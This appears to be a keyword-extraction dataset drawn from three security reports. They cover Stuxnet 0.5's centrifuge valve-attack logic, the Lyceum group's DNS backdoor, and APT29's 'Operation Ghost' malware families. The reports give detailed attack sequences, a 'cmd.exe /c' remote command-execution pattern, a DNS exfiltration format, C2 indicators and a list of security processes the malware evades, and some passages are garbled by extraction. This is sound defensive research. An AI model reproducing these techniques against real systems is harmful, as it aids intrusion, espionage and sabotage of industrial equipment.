cascade. Depending on the configuration, a rating is calculated. Certain devices in certain configurations will result in higher ratings. When complete, only the six highest-rated cascades have data written to DB8061.Finally, a flag is set signifying DB8061 has been built. This flag is reset to 0 every time the “DOWNLOAD” verb is executed.Page 8PLC device attack codeThe code conducts an attack by closing valves in the six top rated cascades out of the possible 18 cascades. The states of two types of valves are modified:• Centrifuge valves – a set of three valves (feed, product, tails) that work in unison per centrifuge to controluranium hexafluoride (UF6) flow into each centrifugeStage valves – one per stage to control UF6 flow into each stage• Auxiliary valves – valves that control UF6 flow into or out of each stage (stage valve) or the cascade as a wholeFigure 2Example valve configuration showing both valve types in three stages of a cascadeSimilar to version 1.x of Stuxnet, the PLC device attack code consists of a state machine with eight possible states:State 0 (Wait): Perform system identification and wait for the enrichment process to reach steady state before attack. This can take approximately 30 days.State 1 (Record): Take peripheral snapshots and build fake input blocks for replaying later.State 2 (Attack centrifuge valves): Begin replaying fake input signals. Close valves on most centrifuges.State 3 (Secondary pressure reading): Open both centrifuge and feed stage valves in the final stage of a single cascade to obtain a low pressure reading.Page 9State 4 (Wait for pressure change): Wait for desired pressure change or time limit. This can take up to approximately two hours.State 5 (Attack auxiliary valves): Open all auxiliary valves except valves believed to be near the first feed stage (stage 10). Wait for three minutes in this state.State 6 (Wait for attack completion): Wait for six minutes while preventing any state changes.State 7 (Finish): Reset and return to state zero.Figure 3State flow diagram of 417 PLC device attack codeState 0:The code verifies the system has reached steady state by monitoring the state of each auxiliary valve and the amount of elapsed time. • The valves must not change state for a period of 300 snapshots. In addition, the code determines if most of thecentrifuge valves are in the open or closed position.• All cascades must be operational for three or more days, or currently be in the down state. • At least one cascade must have been operating for more than 35 days, or collectively all cascades must havebeen operating for more than 297 days.• Between 3 and 7 of the first 21 auxiliary valves must have been opened in the last 2 days.Page 10• Most of the pressure readings associated with the auxiliary valves must be within an expected range. Only if these all conditions are met does the code proceed to state 1.State 1:There are 21 snapshots of the peripheral I/O values that are taken one second apart. These values are stored for replay during the attack. This prevents systems and technicians from realizing the system is no longer operating as expected.State 2:First, the normal operating pressure is obtained and stored for replay later. For each stage a portion of all the centrifuge valves are closed, except in the feed stage (stage 10). The centrifuge valves in the feed stage remain completely open, while the centrifuge valves at both the product end and tails end are completely closed.The particular centrifuge valves closed per stage are randomly chosen. The code will randomly chose a starting centrifuge valve and then close the next one in order until the last centrifuge valve in the stage. If the total desired number of valves to close for that stage has not been reached, the code will continue from the first centrifuge valve in the stage until the maximum valves to close are reached.Table 72231Processing stages and valves states valves to close Percentage also opened. Then, the code obtains a pressure reading at stage 1. The pressure should be relatively low. This value is used for replay in later stages. If the normal pressure operating pressure wasn’t obtained properly in state 2, state 3 is actually skipped and hardcoded default values are used instead.State 4:State 4 waits for the desired pressure change or other predetermined time limits before proceeding to state 5. If any of the following conditions are met, the code will continue to state 5: • The pressure of the stage 10 or stage 11 transducer (these are likely transducers for or near the feed stage) has anabsolute value greater than 280 units above the expected value and greater than five times the expected value.• 46 minutes after the state of an auxiliary valve has been modified from the original state recorded in state 1, withthe exception of auxiliary valve number 17 which is likely a stage valve near the product end.• 2 hours and 3 minutes after the attack started (since state 2) without any centrifuge valve state changes. • 2 hours and 3 minutes since at least four centrifuge valve states have been modified from the original staterecorded in state 1.State 5:In state 5, all the auxiliary valves are opened except valve numbers 17, 18, and 20. Before continuing to state 6, thePage 11code waits for at least 2 minutes and 53 seconds.State 6:During state 6, fake values continue to be replayed and any attempts to change device values are prevented for 6 minutes and 58 seconds.State 7:Data is reset and the code returns to state 0.By closing all valves except the initial feed stage valves, UF6 will continue to flow into the system. This act alone may cause damage to the centrifuges themselves. However, the attack expects the pressure to reach five times the normal operating pressure. At this pressure, significant damage to the uranium enrichment system could occur and the UF6 gas could even revert to a solid.Whether the attack succeeded in this manner or not remains unclear. Even if the attack did succeed, the attackers decided to move to a different strategy in the Stuxnet 1.x versions, attacking the speed of the centrifuges instead.ConclusionStuxnet 0.5 clarifies the evolution and history of Stuxnet. Stuxnet clearly became more aggressive over time and switched development platforms as it evolved from 0.5 versions to later 1.x versions.Key parts of the 417 attack code missing from versions 1.x is fully implemented in Stuxnet 0.5. This demonstrates that the 417 attack code was the first attack strategy implemented by Stuxnet. This original 417 attack code attempted to modify valve states during the uranium enrichment process at Natanz, Iran, to cause damage to the centrifuges and the system as a whole.Figure 4Low-enriched uranium production (source ISIS)The success of Stuxnet 0.5 remains unknown. However, the chart in figure 4 references uranium enrichment production at Natanz to key milestones of Stuxnet development. Interesting events are dips in feed or production amounts and lower levels of production given the same or greater feed amounts (shown as gaps between the two lines).While the discovery of Stuxnet 0.5 helps to deepen our overall understanding of Stuxnet and what its goals are, versions remain unrecovered. If these are located, they may expose other secrets behind this operation and more clues to its origins, but obtaining these other samples may prove to be next to impossible.Page 12Appendix AThe following registry entries are indicators of compromise: • HKEY _ LOCAL _ MACHINE\SYSTEM\CurrentControlSet\Services\MRxCls • HKEY _ LOCAL _ MACHINE\SYSTEM\CurrentControlSet\Services\usbacc11 • HKEY _ USERS\<SID>\Software\Microsoft\Windows\CurrentVersion\Explorer\ShellRecoveryStateThe following files are indicators of compromise: • %WinDir%\inf\mdmcpq3.PNF – Encrypted installation.dll • %WinDir%\inf\mdmeric3.PNF – P2P configuration file • %WinDir%\inf\oem6C.PNF – Log file • %WinDir%\inf\oem7A.PNF – Main Stuxnet component (outbreak.dll) • %WinDir%\inf\oem7F.pnf • %WinDir%\inf\oem7w.pnf – Encrypted installation.dll • %WinDir%\inf\~67.tmp – Encrypted installation.dll • %System%\drivers\mrxcls.sys – Load point driver • %System%\drivers\usbacc11.sys – Load point driver for C&C server modules • %System%\drivers\PCIBUS.SYS – Timer driver for generating BSoD • %System%\comuid.dat • %System%\netsimp32.dll – P2P communication • %System%\inetpsp.dll – C&C server communication • %System%\perfg009.dat • %WinDir%\msagent\agentsb.dll • %WinDir%\msagent\intl\agt0f2e.dll • %System%\complnd.dll • %System%\dllcache\datacprs.dll • %System%\wbem\perfnws.dll • %WinDir%\Installer\{6F716D8C-398F-11D3-85E1-005004838609}\places.dat • %System%\dssbase.dat – Log file • %AllUsersProfile%\Application Data\Microsoft\HTML Help\hhorcslt.dat • %Temp%/DF419a.tmp • %WinDir%\help\winmic.fts – Configuration file for Step 7 infectionsPage 13Appendix BProcesses checked for and the assumed security product associated with the process: • umxagent, Tiny Personal Firewall • cfgintpr, Tiny Personal Firewall • umxldra, Tiny Personal Firewall • amon, Tiny Activity Monitor • UmxCfg, Tiny Personal Firewall • UmxPol, Tiny Personal Firewall • UmxTray, Tiny Personal Firewall • vsmon, ZoneAlarm Personal Firewall • zapro, ZoneAlarm Personal Firewall • zlclient, ZoneAlarm Personal Firewall • tds-3,TDS3 Trojan Defense Suite • filemon, Sysinternals Filemon • regmon, Sysinternals Filemon • rapapp.exe, Blackice Firewall • blackice.exe, Blackice Firewall • blackd.exe, Blackice Firewall • rcfgsvc.exe • pfwcfgsurrogate.exe, Tiny Personal Firewall • pfwadmin.exe, Tiny Personal Firewall • persfw.exe, Kerio Personal Firewall • agentw.exe, Kerio Personal Firewall • agenta.exe, Kerio Personal Firewall • msascui.exe, Windows Defender • msmpeng.exe, Windows Defender • fssm32.exe, F-Secure • fsgk32st.exe, F-Secure • fsdfwd.exe, F-Secure • fsaw.exe, F-Secure • fsavgui.exe, F-Secure • fsav32.exe, F-Secure • fsav.exe, F-Secure • fsma32.exe, F-Secure • fsm32.exe, F-Secure • fsgk32.exe, F-SecurePage 14Appendix CTable of each allowed function identifier, the corresponding device type, and the assumed device name.Table 8Function identifiers, device types, and assumed device name Function identifier PTDevice type Device name Pressure Transmitter 0PCVPIAPITPICPIPSHSHVPVEPZLOZOZLCZCMVSRVSVSSHSMVRVSVYVFIAFITCFITFICFTMFCMFM00000011112233444455558A9CCCCPressure Control ValvePressure Indicator AlarmPressure Indicator TransmitterPressure Indicator ControllerPressure IndicatorPressure SwitchHand SwitchHand ValvePressure ValveVoltage (Test) PointLight Position Open (Status light)Position OpenLight Position ClosedPosition ClosedManual Valve SwitchRelief Valve SwitchValve SwitchHigh Frequency SwitchManual ValveRelief ValveFrequency Control ValveValve State IndicatorFlow Rate Indicator AlarmFlow Rate Indicator Transmitter ControllerFlow Rate Indicator TransmitterFlow Rate Indicator ControllerFlow Rate TransmitterMass Flow ControllerMass Flow MeterPage 15Appendix DOrganization of Stuxnet 0.5 components and behavior of each export.Figure 5Organization of Stuxnet 0.5 componentsTable 9Payload exports for Outbreak.dll Infect Step 7 projects on insertion of removable drivesExport 2Export 4Export 5Export 6Export 7Hook Step 7 for Step 7 project infectionUninstall routineVerifies installationReturns version numberLoads peer-to-peer communication data fileExport 8, 9, and 10Updates Stuxnet from infected Step 7 project archivesExport 11Export 12Export 13Inject module into services.exeInstall routineCall export 1Page 16Resources W32.Duquurl Siemens SIMATIC Products DLL Loading Arbitrary Code Execution Vulnerability (CVE-2012-3015)url 0.5: The Missing Linkurl 0.5: Disrupting Uranium Processing At Natanzurl 0.5: How it Evolvedurl 0.5: Command-and-Control Capabilitiesurl creditsSymantec would like to thank the Institute for Science and International Security (ISIS) for their continued assistance in understanding centrifugal uranium enrichment systems.Page 17About Symantec Symantec protects the world’s information, and is a global leader in security, backup and availability solutions. Our innovative products and services protect people and information in any environment – from the smallest mobile device, to the enterprise data center, to cloud- based systems. Our world-renowned expertise in protecting data, identities and interactions gives our customers confidence in a connected world. More information is available at www.symantec.com or by connecting with Symantec at: go.symantec.com/socialmedia.Symantec Corporation World Headquarters350 Ellis StreetMountain View, CA 94043 USA+1 (650) 527-8000 www.symantec.comCopyright © 2013 Symantec Corporation. All rights reserved. Symantec and the Symantec logo are trademarks or registered trademarks of Symantec Corporation or its affiliates in the U.S. and other countries. Other names may be trademarks of their respective owners. ","{'phrases': ['Infects', 'compromise', 'Siemens Step 7 project files', 'the PLC', 'labels', 'devices', 'the target', '417', 'control', 'centrifuges', 'Data', 'DB8061', 'the attack', 'DOWNLOAD', 'Command', 'enrichment process', 'steady state', 'replaying', 'valves', 'UF6', 'flow', 'cascades', 'Opens', 'pressure', '10', 'Waits', '11', '12', 'any state changes', '13', 'code'], 'target': 'Infects; compromise; Siemens Step 7 project files; the PLC; labels; devices; the target; 417; control; centrifuges; Data; DB8061; the attack; DOWNLOAD; Command; enrichment process; steady state; replaying; valves; UF6; flow; cascades; Opens; pressure; 10; Waits; 11; 12; any state changes; 13; code.'}"
the attack; a macro; the document; AutoOpen; the macro; persistence; a DNS response; DNS queries; the DNS Server; resolving; the DNS backdoor; DnsSystem; control; the system.,"[""1. The threat actor spoofs an Iranian military news website to distribute a macro-enabled Word document. 2. The document's macro downloads and executes a .NET DNS backdoor malware. 3. The malware configures a malicious DNS server under the actor's control. 4. It generates a bot ID from the victim's username. 5. The malware sends DNS queries containing the bot ID to the malicious DNS server. 6. The DNS server responds with commands encoded in DNS records. 7. The backdoor can download files, upload files, and execute system commands based on the commands. 8. It encodes and exfiltrates command output in DNS requests back to the attacker's server. ""]","Extract the keywords: www.zscaler.com /blogs/security-research/lyceum-net-dns-backdoor Lyceum .NET DNS BackdoorActive since 2017, Lyceum group is a state-sponsored Iranian APT group that is known for targeting Middle Eastern organizations in the energy and telecommunication sectors and mostly relying on .NET based malwares.Zscaler ThreatLabz recently observed a new campaign where the Lyceum Group was utilizing a newly developed and customized .NET based malware targeting the Middle East by copying the underlying code from an open source tool.Key Features of this attack:1. The new malware is a .NET based DNS Backdoor which is a customized version of the opensource tool “DIG.net”2. The malware leverages a DNS attack technique called ""DNS Hijacking"" in which anattacker- controlled DNS server manipulates the response of DNS queries and resolve them as per their malicious requirements.3. The malware employs the DNS protocol for command and control (C2) communication whichincreases stealth and keeps the malware communication probes under the radar to evade detection.4. Comprises functionalities like Upload/Download Files and execution of system commands on the infected machine by abusing DNS records, including TXT records for incoming commands and A records for data exfiltration.Delivery mechanismDuring this campaign, the macro-enabled Word document (File name: ir_drones.docm) shown below is downloaded from the domain “http[:]//news-spot.live” disguising itself as a news report related to military1/13affairs in Iran. The text of the document is copied from the following original report here: https[:]//www[.]rferl[.]org/a/iran-drone-program-threats-interests/31660048.htmlFig 1. Attached Macro-enabled Word DocumentOnce the user enables the macro content, the following AutoOpen() function is executed which increases picture brightness using “PictureFormat.Brightness = 0.5” revealing content with the headline, “Iran Deploys Drones To Target Internal Threat, Protect External Interests.”Fig 2. AutoOpen() function revealing content to lure the victimsThe threat actor then leverages the AutoClose() function to drop the DNS backdoor onto the system. Upon closing the document the AutoClose() function is executed, reading a PE file from the text box present on the 7th page of the word document and parsing it further into the required format as shown below with the “MZ” header as the initial two bytes of the byte stream.2/13Fig 3. AutoClose() function reading the PE FileThis PE file is then further written into the Startup folder in order to maintain persistence via the macro code as shown below in the screenshot. With this tactic, whenever the system is restarted, the DNS Backdoor is executed.Fig 4. DNS Backdoor dropped in the Startup folderThe dropped binary is a .NET based DNS Backdoor named “DnsSystem” which allows the threat actors to execute system commands remotely and upload/download data on the infected machine.Below, we analyze the dropped .NET based DNS Backdoor and its inner workings.Lyceum .NET DNS backdoor3/13The Lyceum Group has developed a .NET based DNS Backdoor which has been widely used in the wild in their recent campaigns. As discussed earlier, the backdoor was dropped in the Startup folder of the here: DNS.NET Resolver (C#) - CodeProject. DIG.net is an open source DNS Resolver which can be leveraged to perform DNS queries onto the DNS Server and then parse the response. The threat actors have customized and appended code that allows them to perform DNS queries for various records onto the custom DNS Server, parse the response of the query in order to execute system commands remotely, and upload/download files from the Command & Control server by leveraging the DNS protocol.Initially the malware sets up an attacker controlled DNS server by acquiring the IP Address of the domain name “cyberclub[.]one” = 85[.]206[.]175[.]199 using Dns.GetHostAddresses() for the DIG Resolver function, which in turn triggers an DNS request to cyberclub[.]one for resolving the IP address. Now this IP is associated as the custom attacker controlled DNS Server for all the further DNS queries initiated by the malware.Fig 5. Initialize Attacker-Controlled DNS ServerNext, the Form Load function generates a unique BotID depending on the current Windows username. It converts the username into its MD5 equivalent using the CreateMD5() function, and parses the first 8 bytes of the MD5 as the BotID for the identification of the user and system infected by the malware.4/13Fig 6. Generation of BotID using the Windows usernameNow, the backdoor needs to receive commands from the C2 server in order to perform tasks. The backdoor sends across an initial DNS query to “trailers.apple.com” wherein the domain name “trailers.apple.com” is concatenated with the previously generated BotID before initiation of the DNS request. The DNS query is then sent to the DNS server in order to fetch the “TXT” records for the provided domain name by passing three arguments to the BeginDigIt() function:Name: Target Domain name - EF58DF5Ftrailers.apple.com qType: Records to be queried - TXT qClass: Dns class value - IN (default)Fig 7. Setup of DNS Query parameters before execution of BeginDigIt() FunctionThe BeginDigIt function then executes the main DNS resolver function “DigIt.” This sends across the DNS query in order to fetch the DNS record for the provided target domain name to the DNS server, and parses the response as seen in the code snippet below.Fig 8. DNS Query DigIt Function5/13Comparing the Digit Resolver Code DigIt() function strings with the Dig.Net tool output from the screenshot shown below provides us further assurance that the Dig.Net tool has been customized by the Lyceum Group to develop the following .Net based DNS backdoor Fig 9. Original Dig.net GUI OutputThe malware utilizes a DNS attack technique known as “DNS Hijacking” where in the DNS server is being controlled by the attackers which would allow them to manipulate the response to the DNS queries. Now let's analyze the DNS Hijacking routine below.As discussed earlier, the backdoor performs initial DNS queries in order to fetch the TXT records for the domain EF58DF5trailers.apple.com. EF58DF5 is the BotID generated based on the Windows user to receive commands from the C2 server.6/13Fig 10. DNS query to attacker-controlled DNS server to fetch TXT records.As can be seen in the above screenshot, a DNS query is performed to fetch the TXT records for the domain name: EF58DF5trailers.apple.com to the DNS Server: 85[.]206[.]175[.]199 which is the attacker- controlled DNS server previously initialized.Here’s where the DNS hijacking happens: As the malware sends across a DNS query to fetch the TXT records to the attacker-controlled DNS server, the attacker controlled DNS server responds with an incorrect response consisting of the commands to be executed by the backdoor such as ipconfig,whoami,uploaddd etc as shown in the screenshot below.Fig 11. Ipconfig command returned as the TXT record from the attacker controlled DNS serverFollowing is the DIG.Net DNS response received by the backdoor and then further parsed in order to execute commands on the infected machine.7/13Fig 12. DIG.net output received by the backdoorThe above screenshot consists of the DNS query performed to the attacker controlled DNS server along with the target domain name EF58DF5trailers.apple.com. The Answer section consists of the query response, which includes the target Domain name and the response to the TXT record with two values, “ipconfig” - command to be executed and “1291” - Communication IDNext, the Dig.net response is parsed using multiple pattern regex code routines which parse out the TXT record values—the aforementioned command and communication ID—from the complete response received by the malware.Fig 13. Parsing of TXT RecordsNext, depending on the command received in the TXT record from the C2 server, there are three functions which can be performed by the Lyceum backdoor:Download Files - If the command received from the DNS query consists of a string: “downloaddd” it initiates the download routine and downloads the file from the URL using DownloadFileAsync(). The URL would be the first 11 bytes of the TXT record response value, and stores that downloaded file in the Downloads folder as shown below in the code snippet. This functionality can be leveraged to drop additional malware on the infected machine.8/13Fig 14. Backdoor Download RoutineUpload Files - If the command received from the DNS query consists of a string: “uploaddd”, it uploads the local file on the disk using UploadFileAsync() function to an External URL after parsing the TXT record response value into two variables: uriString (external URL) and filename (Local File). This functionality can be leveraged to exfiltrate data.Fig 14. Backdoor Upload RoutineCommand Execution - If none of the above strings match the TXT record response then the response is passed on to the Command execution routine. There, the response to the txt record is executed as a command on the infected machine using “cmd.exe /c <txt_record_response_command>” and the command output is sent across to the C2 server in the form of DNS A Records.9/13Fig 15. Backdoor Command Execution RoutineIn this case, the TXT record response we received for the DNS query performed against the attacker controlled DNS server is “ipconfig”. This response initiates the Command execution routine of the backdoor and thus the command “ipconfig” would be executed on the infected machine - cmd.exe /c ipconfigFurther, the command output is exfiltrated to the C2 server, encoded in Base64 and then concatenated with the Communication ID and the previously generated BotUID using “$” as the separator.Fig 16. Command Output exfiltration Pattern setupData Exfil Pattern: [base64encoded_command_output]$[communication_id]$[Bot_ID]10/13Once the command output is encoded in the above mentioned pattern, the DNS backdoor then sends across the output to the C2 server via DNS query in the form of A records in multiple blocks of queries, where the A record values consists of the encoded command output. Once the command output is transmitted completely, an “Enddd” command is sent across in a Base64-encoded data exfil pattern to notify the end of the command output as shown below in the screenshot.Fig 17. Exfiltration of Encoded Command Output via A records queries on the attacker controlled DNS serverDecoded A Records:IPConfig Command Output -Encoded A record = ICAgSVB2NCBBZGRyZXNzLiAuIC4gLiAuIC4gLiAuIC4gLiAuIDogMTkyLjE2OC4.yLjEw$929$5686BB2FDecoded A record = against their targets. Attackers continuously embrace new anti-analysis tricks to evade security solutions; re-packaging of malware makes static analysis even more challenging. The Zscaler ThreatLabz team will continue to monitor these attacks to help keep our customers safe.MITRE ATT&CK mapping:T1059 Command and Scripting Interpreter T1055 Process Injection T1562 Disable or Modify Tools T1010 Application Window Discovery T1018 Remote System Discovery T1057 Process Discovery T1518 Security Software Discovery ","{'phrases': ['The threat actor', 'Iranian', 'the document', 'Downloads', 'DNS Backdoor', 'the malware', 'Fig', 'control', 'DNS queries', 'IN', 'the DNS Server', 'code', 'DNS records', 'the backdoor', 'Download Files', 'upload files', 'system commands', 'the commands', 'output'], 'target': 'The threat actor; Iranian; the document; Downloads; DNS Backdoor; the malware; Fig; control; DNS queries; IN; the DNS Server; code; DNS records; the backdoor; Download Files; upload files; system commands; the commands; output.'}"
the attackers; email; a malicious attachment; malware; the Dukes; persistence; the server; shellcode; RegDuke backdoor; liteDuke; commands; data; screenshots; files; the malware; persistence; processes; the C&C server; control flow; obfuscation; detection; the group; the backdoor; data; the attackers; time; persistence.,"[' 1. Send spearphishing emails with malicious attachments to targets. 2. Malicious attachment executes and drops PolyglotDuke or RegDuke first stage. 3. First stage collects system info and connects to command servers on Twitter, Reddit, etc. to get instructions. 4. First stage downloads and executes MiniDuke second stage backdoor. 5. MiniDuke escalates privileges and downloads FatDuke final backdoor. 6. FatDuke exfiltrates documents and data to command servers over HTTPS. ']","Extract the keywords: ESET Research White papers // October 2019OPERATION GHOST The Dukes aren’t back — they never leftMatthieu Faou Mathieu Tartare Thomas DupuyTABLE OF CONTENTS LIST OF TABLES Table 7List of parameters used to generate GET request to the C&C server 14 Example of redirection from the C&C servers’ root URLs 16 List of execution type combination and their corresponding behavior 18 RegDuke Windows registry keys 19 Hardcoded User-Agent 25 FatDuke backdoor commands 27 User-Agent strings used by LiteDuke 33LIST OF FIGURES Figure 1 Dukes history timeline– newly discovered items related to Operation Ghostare shaded 6 Figure 2 Historical malicious email example 7 Figure 3 Decoy document opened by the malicious attachment 7 Figure 4 Reddit post containing an encoded C&C URL 9 Figure 5 Timeline of Operation Ghost 9 Figure 6 Comparison of a custom string encryption function found in PolyglotDukeand in OnionDuke samples from 2013 10Figure 7 Comparison of the same function in MiniDuke from 2014 and inMiniDuke from 2018 11 Summary of Operation Ghost malware platform 12 Figure 8 Figure 9 Dukes operational hours 13 Figure 10 Example of a public post containing an encoded C&C URL 14 Figure 11 C&C response with a path to an image to download 16 Figure 12 Communication sequence with the C&C server 16 Figure 13 Embedded blob format 17 Figure 14 Decompiled hash signature verification procedure 18 Figure 15 Public key used to verify the hash signature 18 Figure 16 Encrypted blob format after decryption 18 Figure 17 Obfuscated RegDuke sample 19 Figure 18 RegDuke The path, password and salt are hardcoded in this example 19 Figure 19 Decryption of RegDuke payload 20 Figure 20 Dropbox backdoor configuration (redacted) 20 Figure 21 Example of two pictures downloaded from the Dropbox directory 21 Figure 22 Loop extracting a payload from the pixels of a downloaded picture 21 Figure 23 The least significant bits of each color of each pixel are extracted to recoverthe hidden data 21 Figure 24 Comparison between a blue of value 255 and a blue of value 248 22Figure 25 Invalid digital signature added to the backdoor 22 23 Figure 26 Control flow flattening used to obfuscate the MiniDuke backdoor Figure 27 Post request to the C&C server that looks like a regular jpeg file upload 23 Figure 28 FatDuke configuration data in the PE resources 24 25 Figure 29 FatDuke configuration example Figure 30 FatDuke C&C protocol 26 Figure 31 Additional image tag sent by FatDuke C&C 27 Figure 32 C&C response including most of a valid PNG header and an encryptedcommand for FatDuke27 Figure 33 Example of commands sent to FatDuke 28 Figure 34 FatDuke obfuscation – String stacking 29 Figure 35 FatDuke obfuscation – Opaque predicate 29 Figure 36 FatDuke obfuscation – Junk function call 30 Figure 37 FatDuke obfuscation – Junk function return value 30 Figure 38 FatDuke obfuscation – Chromium strings 30 Figure 39 LiteDuke unpacking process 31 Figure 40 Curious phone number left by the attackers 31 Figure 41 Assembler used by the developer (screenshot of DIE analysis) 32 Figure 42 Multiple while loops instead of a backdoor switch case 33 Figure 43 List of LiteDuke command IDs 33 Figure 44 LiteDuke C&C domain, resources and parameters 3451. EXECUTIVE SUMMARY It is exceptionally rare for a well-documented threat actor, previously implicated in very high-profile attacks, to stay completely under the radar for several years. Yet, in the last three years that is what APT group the Dukes (aka APT29 and Cozy Bear) has done. Despite being well known as one of the groups to hack the Democratic National Committee in the run-up to the 2016 US election, the Dukes has received little subse- quent attention. The last documented campaign attributed to them is a phishing campaign against the Norwegian government that dates back to January 2017.In this white paper, we describe how we uncovered that the Dukes had been running successful espionage campaigns while avoiding public scrutiny, thanks to stealthy communication techniques and retooling. We call these newly uncovered Dukes campaigns, collectively, Operation Ghost, and describe how the group has been busy compromising government targets, including three European Ministries of Foreign Affairs and the Washington DC embassy of a European Union country, all without drawing attention to their activities. Key points in this white paper:The Dukes never stopped their espionage activities.• Operation Ghost likely started in 2013. • The last known activity linked to Operation Ghost occurred in June 2019. • ESET researchers identified at least three victims: all European Ministries of Foreign Affairs includingthe Washington DC embassy of a European Union country.• The Dukes have used four new malware families in this campaign: PolyglotDuke, RegDuke, FatDukeand LiteDuke.• Operation Ghost uses a previously documented Dukes backdoor: MiniDuke. • The Dukes have leveraged online services such as Twitter, Imgur and Reddit to act as primary Commandand Control (C&C) channels for their first-stage malware.• The Dukes have used very stealthy techniques such as steganography to hide communications betweencompromised machines and their C&C servers.For any inquiries related to this white paper, contact us at threatintel@eset com.2. BACKGROUND The Dukes, also known as APT29 and Cozy Bear, is an infamous cyberespionage group active since at least 2008. In particular, it is known for being one of the adversaries to have breached the Democratic National Committee during the 2016 US presidential election [1]. It was even featured in a joint report issued by the FBI and the Department of Homeland Security (DHS), as part of malicious cyber-activities the report dubbed Grizzly Steppe [2]. That report was published in 2017 and describes malicious activities that occurred around the presidential election of 2016.This section is a summary of the group’s previously documented activities to refresh the reader’s memory, since the last related publication dates from almost three years ago. Our most recent discoveries are detailed in the subsequent sections of this white paper.2.1 Timeline Even though the group’s activities are believed to have started in 2008, the first public report was released in 2013 with the analysis of MiniDuke by Kaspersky [3]. Over the next two years, multiple reports dissected the Dukes’ arsenal, including a comprehensive summary by F-Secure of the group’s activities from 2008 to 2015 [4].One of the most recent attacks that we can link to the Dukes is the January 2017 phishing attempt against the Ministry of Foreign Affairs, the Labour Party and the Armed Forces of Norway [5]. Since then, most security experts have believed the Dukes went dark or completely changed their arsenal to pursue their mission.6In November 2018, a strange phishing campaign hit dozens of different organizations in the United States, including government agencies, and think tanks. The attack leveraged a malicious Windows shortcut (a .lnk file) that bore similarities to a malicious shortcut used by the Dukes in 2016. However, that earlier sample was available in a public malware repository for many years, allowing another actor to easily conduct a false-flag operation. In addition, there is no evidence that any custom malware used only by the Dukes was employed during this attack. From FireEye’s detailed analysis of the attack [6], it was not possible to make a high-confidence attribution to this threat actor.Figure 1 summarizes the important events of the Dukes history. Some activities related to Operation Ghost are also presented to help understand the overlap between all the events.(cid:31)(cid:30)(cid:30)(cid:29)(cid:31)(cid:30)(cid:28)(cid:27)(cid:31)(cid:30)(cid:28)(cid:27)N E WDukes’ ﬁrst known activitiesFirst public report by Kaspersky Labs(cid:31)(cid:30)(cid:28)(cid:25)AugustN E W(cid:31)(cid:30)(cid:28)(cid:25)First known activity linked to Operation Ghost by ESET(cid:31)(cid:30)(cid:28)6SeptemberN E WFirst known deployment of the RegDuke malwareGrizzly Steppe report by the FBI and the DHSFirst known deployment of the latest third(cid:141)stage implant: FatDukeNewly discovered items related to Operation Ghost(cid:31)(cid:30)(cid:28)(cid:24)Attack against the US Democratic National Committee †discovered in ‡ˆ‰Š‹(cid:31)(cid:30)(cid:28)8October(cid:31)(cid:30)(cid:28)(cid:23)JuneLast known Twitter account registered by the DukesLatest observed activityFigure 1 // Dukes history timeline2.2 Targets Over the years, it has been possible to draw the big picture of the Dukes main targets. The group is primarily interested in spying on governments either in the West or in former USSR countries. Besides governments, the group has also targeted various organizations linked to NATO, think tanks, and political parties.This targeting suggests a clear interest in collecting information allowing a better understanding of future international political decisions, which would seem of most interest to a government. Unlike other groups such as GreyEnergy [7] and TeleBots [8], it is important to note that we have never seen the Dukes engaged in cybersabotage operations.Surprisingly though, the group also has conducted spying operations outside its main focus. In 2013, Kaspersky researchers found evidence that part of the Dukes toolset had been used against drug dealers in Russia [9]. This may suggest that this toolset is not only used for collecting foreign intelligence but also for conducting LE investigations of criminal activities.72.3 Tools and tactics The Dukes group is known to be a major player in the espionage scene. It is associated with a large toolset with more than ten different malware families written in C/C++ [10], PowerShell [11], .NET [12] and Python [13]. It has also adopted living-off-the-land tactics, misusing standard IT tools such as PsExec and Windows Management Instrumentation (WMI).As mentioned before, we invite our readers to read the F-Secure summary [4] for an analysis of the earlier malware platforms used by this threat actor.Delivery The group’s main initial tactic to breach a network is to send spearphishing emails that contain a link or an attachment. Figure 2 is an example of one such campaign, which occurred at the end of 2016. In order to increase the attackers’ chances, it is designed to be a subject of particular interest of the recipient. This is different from mass-spreading malicious email campaigns where the same email is sent to hundreds or thousands of people by crimeware actors.Source: url volexity com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/Figure 2 // Historical malicious email example.When targets click on these malicious links or attachments, a .zip archive that contains a malicious, macro-enabled Word document and a decoy (as shown in Figure 3) will be downloaded. If victims then open the malicious document and enable the macro, it will then install the PowerDuke backdoor [14]. In other cases, malicious Windows shortcuts (.lnk files) have been used instead of Word documents with malicious macros.Figure 3 // Decoy document opened by the malicious attachment8However, this is not the only method used by the Dukes to gain initial access. In 2014, the Dukes started using two mass-spreading methods to deliver the OnionDuke implant:• Trojanized pirated applications downloaded via BitTorrent • A malicious TOR exit node to trojanize downloaded applications on the fly [15] [16]OnionDuke has some capabilities outside the standard espionage features, such as a Denial of Service (DoS) module, but we have not observed them used in the wild.Finally, the Dukes are also known for using multiple implants to compromise a target. It is very common to see an implant delivering another one to regain control of a system.Command and Control (C&C) The Dukes have employed several interesting tactics to hide the communications between the implants and their C&C servers, including the use of social media platforms and steganography.MiniDuke [17] and HammerDuke [12] leveraged Twitter to host their C&C URLs. In addition, they use a Domain Generation Algorithm (DGA) to generate new Twitter handles. Each time the malware generates a new handle, it fetches the Twitter page corresponding to that handle and searches the page for a specific pattern, which is the encrypted C&C URL.In CloudDuke [18], the operators leveraged cloud storage services such as OneDrive as their C&C channels. They were not the first group to use this technique, but it is generally effective for the attackers as it is harder for defenders to spot hostile connections to legitimate cloud storage services than to other “suspicious” or low-reputation URLs.Moreover, the Dukes like to use steganography to hide data, such as additional payloads, in pictures. It allows them to blend into typical network traffic by transferring valid images while its true purpose is to allow the backdoor to communicate with the C&C server. This technique has been described in Volexity’s PowerDuke blogpost [14].3. OPERATION GHOST After 2017, it was not clear how the Dukes evolved. Did they totally stop their activities? Did they fully re-write their tools and change their tradecraft?We spent months apparently chasing a ghost then, a few months ago, we were able to attribute several distinct intrusions to the Dukes. During the analysis of those intrusions, we uncovered several new malware families: PolyglotDuke, RegDuke and FatDuke. We call the Dukes’ campaigns using these newly discovered tools Operation Ghost3.1 Targets and timeline We believe Operation Ghost started in 2013 and was still ongoing as of this writing. Our research shows that the Ministry of Foreign Affairs in at least three different countries in Europe are affected by this cam- paign. We also have discovered an infiltration by the Dukes at the Washington, DC embassy of a European Union country.This targeting is not surprising, and it shows that the Dukes are still active in high-profile organizations. We also believe that more organizations around the world might be affected but due to the use of unique C&C infrastructure for each victim, 